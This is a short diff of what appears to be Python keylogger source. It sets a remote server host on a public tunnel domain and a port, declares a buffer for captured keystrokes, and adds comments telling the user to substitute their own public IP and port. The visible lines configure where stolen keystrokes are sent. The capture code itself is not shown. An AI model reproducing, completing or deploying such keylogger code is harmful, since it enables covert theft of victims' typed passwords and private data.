@@ -4,8 +4,8 @@ import socket
 import time
 
 # Server details (your external tunnel address)
-SERVER_HOST = 'rock-grain.gl.at.ply.gg'
-SERVER_PORT = 18756
+SERVER_HOST = 'rock-grain.gl.at.ply.gg'  #change this ip with your Public IP
+SERVER_PORT = 18756   #change this to your public port
 
 # Buffer to store keystrokes
 keystrokes = []
